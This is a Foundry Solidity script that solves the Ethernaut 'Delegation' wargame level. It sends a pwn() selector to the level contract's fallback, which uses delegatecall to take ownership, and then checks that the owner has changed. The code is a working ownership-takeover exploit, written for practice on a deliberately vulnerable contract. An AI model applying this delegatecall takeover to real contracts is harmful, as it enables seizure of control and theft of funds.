// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Delegation/Delegation.sol";

// Copy address instance from Ethernaut:
address constant LEVEL_INSTANCE = 0x312297dDcfE20a8AaFd724814495bD5d1EA8d57a;

contract DelegationScript is Script {
    function setUp() public {}

    function run() public {
        console.log(" # Running Level 6 Script");
        console.log(" |- msg.sender: ", msg.sender);

        Delegation dl = Delegation(payable(LEVEL_INSTANCE));

        address owner = dl.owner();
        console.log(" |- Level owner: ", owner);

        vm.startBroadcast();

        // Call the fallback function to pwn the contract
        console.log(" |- Calling fallback to pwn the contract");
        (bool success, ) = payable(LEVEL_INSTANCE).call(
            abi.encodeWithSelector(bytes4(keccak256("pwn()")))
        );
        // require(success, "fallback call failed");

        vm.stopBroadcast();

        // Check if contract has a new owner
        owner = dl.owner();
        console.log(" |- Level owner: ", owner);

        // Make sure the contract is pwned
        require(owner == msg.sender, " ##### Contract still not pwned! ##### ");

        console.log(" `- End of Level");
    }
}
